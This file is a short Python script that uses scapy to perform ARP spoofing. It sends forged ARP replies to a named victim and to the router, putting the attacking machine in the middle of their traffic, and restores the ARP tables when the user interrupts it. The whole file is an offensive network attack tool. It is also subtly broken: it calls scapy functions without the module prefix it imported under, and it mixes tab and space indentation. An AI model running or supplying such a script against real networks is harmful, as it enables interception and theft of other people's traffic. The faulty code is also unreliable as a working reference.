#!/usr/bin/env python3

import scapy.all as scapy
import sys
import time

if len(sys.argv) != 3:
    print("Usage: sudo python3 arpspoof.py <Victim_IP> <Router_IP>")
    sys.exit(1)

victim_ip = sys.argv[1]
router_ip = sys.argv[2]

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
	print(f"Could not find MAC for {ip}")
	sys.exit(1)

victim_mac = get_mac(victim_ip)
router_mac = get_mac(router_ip)

print(f"Victim {victim_ip} is at {victim_mac}")
print(f"Router {router_ip} is at {router_mac}")

def spoof(target_ip, spoof_ip, target_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(destination_ip, destination_mac, source_ip, source_mac):
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                 psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

try:
    print("Starting ARP spoofing. Press Ctrl+C to stop.")
    while True:
        spoof(victim_ip, router_ip, victim_mac)  # Tell victim: router is at Kali
        spoof(router_ip, victim_ip, router_mac)  # Tell router: victim is at Kali
        time.sleep(2)
except KeyboardInterrupt:
    print("\nCTRL+C detected, restoring...")
    restore(victim_ip, victim_mac, router_ip, router_mac)
    restore(router_ip, router_mac, victim_ip, victim_mac)
    print("ARP tables restored. Exiting.")
